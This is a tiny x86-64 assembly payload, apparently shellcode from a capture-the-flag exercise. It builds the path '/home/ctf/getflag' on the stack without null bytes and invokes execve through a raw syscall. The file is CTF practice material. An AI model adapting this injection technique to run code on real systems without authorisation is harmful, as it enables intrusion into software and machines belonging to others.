    BITS 64

    ;;; /home/ctf/getflag

_start:
    xor eax, eax
    push rax
    mov rax, `/getflag`
    push rax
    mov rax, `////ctf/`
    push rax
    mov rax, `////home`
    push rax

    mov eax, 0x3b
    mov rdi, rsp
    xor esi, esi
    xor edx, edx
    syscall

    jmp $